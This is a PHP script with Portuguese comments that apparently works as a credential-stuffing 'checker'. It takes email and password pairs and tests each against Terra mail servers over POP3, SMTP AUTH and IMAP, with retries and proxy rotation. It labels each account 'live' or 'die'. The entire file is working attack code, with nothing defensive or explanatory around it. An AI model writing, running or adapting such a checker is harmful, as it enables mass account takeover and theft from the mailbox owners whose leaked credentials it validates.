<?php
define('CRLF', chr(13) . chr(10));
define('LF', chr(10));
define('DQ', chr(34));

while (ob_get_level() > 0) { @ob_end_clean(); }
ob_start();

error_reporting(0);
ini_set('display_errors', '0');
ini_set('display_startup_errors', '0');
ini_set('log_errors', '0');
ini_set('max_execution_time', '120');

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

$action = isset($_GET['action']) ? $_GET['action'] : '';

if ($action === 'init') {
    $proxies = array();
    $proxyFile = __DIR__ . '/proxies.txt';
    if (file_exists($proxyFile)) {
        $content = @file_get_contents($proxyFile);
        $lines = array_filter(array_map('trim', explode(LF, $content)));
        foreach ($lines as $line) {
            if (empty($line) || $line[0] === '#') continue;
            $proxies[] = $line;
        }
    }
    ob_end_clean();
    echo json_encode(array('status' => 'ok', 'proxies' => array_values(array_unique($proxies))));
    exit;
}

if ($action === 'test_proxy') {
    $proxy = isset($_POST['proxy']) ? $_POST['proxy'] : '';
    if (empty($proxy)) {
        ob_end_clean();
        echo json_encode(array('status' => 'fail'));
        exit;
    }
    $ok = testProxy($proxy);
    ob_end_clean();
    echo json_encode(array('status' => $ok ? 'ok' : 'fail'));
    exit;
}

if ($action === 'diag_check') {
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $proxy = isset($_POST['proxy']) ? $_POST['proxy'] : '';
    $diag = array('email' => $email, 'methods' => array());

    $diag['methods']['pop3_110'] = diagPop3($email, $password, 'pop.sao.terra.com.br', 110, false, 15);
    $diag['methods']['smtp_587'] = diagSmtp($email, $password, 'smtp.sao.terra.com.br', 587, false, 15);
    $diag['methods']['smtp_465'] = diagSmtp($email, $password, 'smtp.terra.com.br', 465, true, 15);
    $diag['methods']['imap_993'] = diagImap($email, $password, 'imap.terra.com.br', 993, 15);

    ob_end_clean();
    echo json_encode($diag, JSON_PRETTY_PRINT);
    exit;
}

if ($action === 'check') {
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $proxy = isset($_POST['proxy']) ? $_POST['proxy'] : '';
    if (empty($email) || empty($password)) {
        ob_end_clean();
        echo json_encode(array('status' => 'die', 'email' => $email, 'reason' => 'Vazio'));
        exit;
    }
    try {
        $result = doValidate($email, $password, $proxy);
    } catch (\Throwable $e) {
        $result = array('status' => 'die', 'email' => $email, 'reason' => 'Erro');
    }
    ob_end_clean();
    echo json_encode($result);
    exit;
}

ob_end_clean();
echo json_encode(array('status' => 'ok'));
exit;

function parseProxy($proxy) {
    $host = ''; $port = 0; $user = ''; $pass = ''; $type = 'http';
    $lower = strtolower($proxy);
    if (strpos($lower, 'socks5') === 0) $type = 'socks5';
    elseif (strpos($lower, 'socks4') === 0) $type = 'socks4';
    if (preg_match('#^(socks[45]h?|https?)://([^:@]+):([^@]+)@([^:]+):(\d+)$#i', $proxy, $m)) {
        $user = $m[2]; $pass = $m[3]; $host = $m[4]; $port = (int)$m[5];
    } elseif (preg_match('#^([^:@]+):([^@]+)@([^:]+):(\d+)$#', $proxy, $m)) {
        $user = $m[1]; $pass = $m[2]; $host = $m[3]; $port = (int)$m[4];
    } elseif (preg_match('#^(socks[45]h?|https?)://([^:]+):(\d+)$#i', $proxy, $m)) {
        $host = $m[2]; $port = (int)$m[3];
    } elseif (preg_match('#^([^:]+):(\d+)$#', $proxy, $m)) {
        $host = $m[1]; $port = (int)$m[2];
    }
    return array('host' => $host, 'port' => $port, 'user' => $user, 'pass' => $pass, 'type' => $type);
}

function applyProxyToCurl($ch, $proxy) {
    if (empty($proxy)) return;
    $p = parseProxy($proxy);
    if (empty($p['host'])) return;
    curl_setopt($ch, CURLOPT_PROXY, $p['host'] . ':' . $p['port']);
    if ($p['type'] === 'socks5') {
        curl_setopt($ch, CURLOPT_PROXYTYPE, 7);
    } else {
        curl_setopt($ch, CURLOPT_PROXYTYPE, 0);
        curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
    }
    if (!empty($p['user'])) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $p['user'] . ':' . $p['pass']);
    }
}

function testProxy($proxy) {
    if (!extension_loaded('curl')) return false;
    $p = parseProxy($proxy);
    if (empty($p['host'])) return false;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    applyProxyToCurl($ch, $proxy);
    $result = curl_exec($ch);
    curl_close($ch);
    return ($result !== false && strlen(trim($result)) > 0);
}

// =========================================
//  DO VALIDATE — 4 metodos em cascata
// =========================================
function doValidate($email, $password, $proxy) {
    $timeout = 15;
    $delays = array(0, 2000000, 4000000, 7000000, 10000000);

    for ($attempt = 0; $attempt < 5; $attempt++) {
        if ($delays[$attempt] > 0) usleep($delays[$attempt]);

        // 1. POP3 porta 110 (sem SSL) — servidor diferente
        $r = tryPop3($email, $password, 'pop.sao.terra.com.br', 110, false, $timeout);
        if ($r !== null) return $r;

        // 2. SMTP AUTH porta 587 (sem SSL) — servidor diferente
        $r = trySmtpAuth($email, $password, 'smtp.sao.terra.com.br', 587, false, $timeout);
        if ($r !== null) return $r;

        // 3. SMTP AUTH porta 465 (SSL)
        $r = trySmtpAuth($email, $password, 'smtp.terra.com.br', 465, true, $timeout);
        if ($r !== null) return $r;

        // 4. IMAP porta 993 (SSL) — fallback
        $r = tryImap($email, $password, 'imap.terra.com.br', 993, $timeout);
        if ($r !== null) return $r;
    }

    return array('status' => 'die', 'email' => $email, 'reason' => 'Connection failed', 'retry_exhausted' => true);
}

// =========================================
//  POP3 — valida credenciais via protocolo POP3
//  Servidor: pop.sao.terra.com.br:110
// =========================================
function tryPop3($email, $password, $host, $port, $useSsl, $timeout) {
    $remote = $useSsl ? 'ssl://' . $host : $host;
    $socket = @fsockopen($remote, $port, $errno, $errstr, $timeout);
    if ($socket === false) return null;

    stream_set_timeout($socket, $timeout);
    stream_set_blocking($socket, true);

    // Ler greeting
    $greeting = readLine($socket, $timeout);
    if ($greeting === false || strpos($greeting, '+OK') !== 0) {
        fclose($socket);
        return null;
    }

    // USER
    fwrite($socket, 'USER ' . $email . CRLF);
    $resp = readLine($socket, $timeout);
    if ($resp === false || strpos($resp, '+OK') !== 0) {
        fclose($socket);
        return null;
    }

    // PASS
    fwrite($socket, 'PASS ' . $password . CRLF);
    $resp = readLine($socket, $timeout);

    // QUIT
    @fwrite($socket, 'QUIT' . CRLF);
    fclose($socket);

    if ($resp === false) return null;

    if (strpos($resp, '+OK') === 0) {
        return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
    }

    if (strpos($resp, '-ERR') === 0) {
        return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
    }

    return null;
}

// =========================================
//  SMTP AUTH — valida credenciais via SMTP
//  Servidor: smtp.sao.terra.com.br:587 ou smtp.terra.com.br:465
// =========================================
function trySmtpAuth($email, $password, $host, $port, $useSsl, $timeout) {
    $remote = $useSsl ? 'ssl://' . $host : $host;
    $socket = @fsockopen($remote, $port, $errno, $errstr, $timeout);
    if ($socket === false) return null;

    stream_set_timeout($socket, $timeout);
    stream_set_blocking($socket, true);

    // Ler greeting
    $greeting = readLine($socket, $timeout);
    if ($greeting === false || strpos($greeting, '220') !== 0) {
        fclose($socket);
        return null;
    }

    // EHLO
    fwrite($socket, 'EHLO checker.local' . CRLF);
    $ehlo = readLines($socket, $timeout);
    if ($ehlo === false) {
        fclose($socket);
        return null;
    }

    // AUTH LOGIN
    fwrite($socket, 'AUTH LOGIN' . CRLF);
    $resp = readLine($socket, $timeout);
    if ($resp === false || strpos($resp, '334') !== 0) {
        // Tentar AUTH PLAIN
        $auth_plain = base64_encode(chr(0) . $email . chr(0) . $password);
        fwrite($socket, 'AUTH PLAIN ' . $auth_plain . CRLF);
        $resp = readLine($socket, $timeout);
        @fwrite($socket, 'QUIT' . CRLF);
        fclose($socket);
        if ($resp === false) return null;
        if (strpos($resp, '235') === 0) return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
        if (strpos($resp, '535') === 0 || strpos($resp, '530') === 0) return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
        return null;
    }

    // Enviar email (base64)
    fwrite($socket, base64_encode($email) . CRLF);
    $resp = readLine($socket, $timeout);
    if ($resp === false || strpos($resp, '334') !== 0) {
        @fwrite($socket, 'QUIT' . CRLF);
        fclose($socket);
        return null;
    }

    // Enviar senha (base64)
    fwrite($socket, base64_encode($password) . CRLF);
    $resp = readLine($socket, $timeout);

    @fwrite($socket, 'QUIT' . CRLF);
    fclose($socket);

    if ($resp === false) return null;

    if (strpos($resp, '235') === 0) return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
    if (strpos($resp, '535') === 0 || strpos($resp, '530') === 0 || strpos($resp, '550') === 0) {
        return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
    }

    return null;
}

// =========================================
//  IMAP — fallback
// =========================================
function tryImap($email, $password, $host, $port, $timeout) {
    $socket = @fsockopen('ssl://' . $host, $port, $errno, $errstr, $timeout);
    if ($socket === false) return null;
    stream_set_timeout($socket, $timeout);
    stream_set_blocking($socket, true);

    $greeting = readLine($socket, $timeout);
    if ($greeting === false || stripos($greeting, 'OK') === false) {
        fclose($socket);
        return null;
    }

    $safe_email = str_replace(array(chr(92), chr(34)), array(chr(92) . chr(92), chr(92) . chr(34)), $email);
    $safe_pass = str_replace(array(chr(92), chr(34)), array(chr(92) . chr(92), chr(92) . chr(34)), $password);
    $cmd = 'A1 LOGIN ' . DQ . $safe_email . DQ . ' ' . DQ . $safe_pass . DQ . CRLF;
    fwrite($socket, $cmd);

    $response = '';
    $deadline = microtime(true) + $timeout;
    while (!feof($socket)) {
        $line = @fgets($socket, 8192);
        if ($line === false) { usleep(50000); continue; }
        $response .= $line;
        if (strpos(trim($line), 'A1 ') === 0) break;
        if (microtime(true) > $deadline) break;
    }
    @fwrite($socket, 'A2 LOGOUT' . CRLF);
    fclose($socket);

    if (preg_match('/A1\s+OK/i', $response)) return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
    if (preg_match('/A1\s+NO/i', $response)) return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
    if (preg_match('/A1\s+BAD/i', $response)) return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
    return null;
}

// =========================================
//  Helpers de leitura de socket
// =========================================
function readLine($socket, $timeout) {
    $deadline = microtime(true) + $timeout;
    while (!feof($socket) && microtime(true) < $deadline) {
        $line = @fgets($socket, 8192);
        if ($line === false) { usleep(50000); continue; }
        return $line;
    }
    return false;
}

function readLines($socket, $timeout) {
    $result = '';
    $deadline = microtime(true) + $timeout;
    while (!feof($socket) && microtime(true) < $deadline) {
        $line = @fgets($socket, 8192);
        if ($line === false) { usleep(50000); continue; }
        $result .= $line;
        $trimmed = trim($line);
        if (preg_match('/^\d{3} /', $trimmed)) break;
    }
    return $result;
}

// =========================================
//  Diagnostico
// =========================================
function diagPop3($email, $password, $host, $port, $useSsl, $timeout) {
    $t0 = microtime(true);
    $remote = $useSsl ? 'ssl://' . $host : $host;
    $socket = @fsockopen($remote, $port, $errno, $errstr, $timeout);
    if ($socket === false) {
        return array('ok' => false, 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => sprintf('%s (%d)', $errstr, $errno));
    }
    stream_set_timeout($socket, $timeout);
    $greeting = readLine($socket, $timeout);
    if ($greeting === false || strpos($greeting, '+OK') !== 0) {
        fclose($socket);
        return array('ok' => false, 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => 'No greeting', 'greeting' => substr($greeting, 0, 200));
    }
    fwrite($socket, 'USER ' . $email . CRLF);
    $r1 = readLine($socket, $timeout);
    fwrite($socket, 'PASS ' . $password . CRLF);
    $r2 = readLine($socket, $timeout);
    @fwrite($socket, 'QUIT' . CRLF);
    fclose($socket);
    $timeMs = round((microtime(true) - $t0) * 1000);
    return array('ok' => true, 'time_ms' => $timeMs, 'user_resp' => substr($r1, 0, 200), 'pass_resp' => substr($r2, 0, 200));
}

function diagSmtp($email, $password, $host, $port, $useSsl, $timeout) {
    $t0 = microtime(true);
    $remote = $useSsl ? 'ssl://' . $host : $host;
    $socket = @fsockopen($remote, $port, $errno, $errstr, $timeout);
    if ($socket === false) {
        return array('ok' => false, 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => sprintf('%s (%d)', $errstr, $errno));
    }
    stream_set_timeout($socket, $timeout);
    $greeting = readLine($socket, $timeout);
    if ($greeting === false || strpos($greeting, '220') !== 0) {
        fclose($socket);
        return array('ok' => false, 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => 'No greeting', 'greeting' => substr($greeting, 0, 200));
    }
    fwrite($socket, 'EHLO checker.local' . CRLF);
    $ehlo = readLines($socket, $timeout);
    fwrite($socket, 'AUTH LOGIN' . CRLF);
    $r1 = readLine($socket, $timeout);
    if (strpos($r1, '334') === 0) {
        fwrite($socket, base64_encode($email) . CRLF);
        $r2 = readLine($socket, $timeout);
        fwrite($socket, base64_encode($password) . CRLF);
        $r3 = readLine($socket, $timeout);
        @fwrite($socket, 'QUIT' . CRLF);
        fclose($socket);
        $timeMs = round((microtime(true) - $t0) * 1000);
        return array('ok' => true, 'time_ms' => $timeMs, 'auth_resp' => substr($r1, 0, 100), 'email_resp' => substr($r2, 0, 100), 'pass_resp' => substr($r3, 0, 200));
    }
    // Tentar AUTH PLAIN
    $auth_plain = base64_encode(chr(0) . $email . chr(0) . $password);
    fwrite($socket, 'AUTH PLAIN ' . $auth_plain . CRLF);
    $r = readLine($socket, $timeout);
    @fwrite($socket, 'QUIT' . CRLF);
    fclose($socket);
    $timeMs = round((microtime(true) - $t0) * 1000);
    return array('ok' => true, 'time_ms' => $timeMs, 'auth_login_resp' => substr($r1, 0, 100), 'plain_resp' => substr($r, 0, 200));
}

function diagImap($email, $password, $host, $port, $timeout) {
    $t0 = microtime(true);
    $socket = @fsockopen('ssl://' . $host, $port, $errno, $errstr, $timeout);
    if ($socket === false) {
        return array('ok' => false, 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => sprintf('%s (%d)', $errstr, $errno));
    }
    fclose($socket);
    return array('ok' => true, 'time_ms' => round((microtime(true) - $t0) * 1000));
}
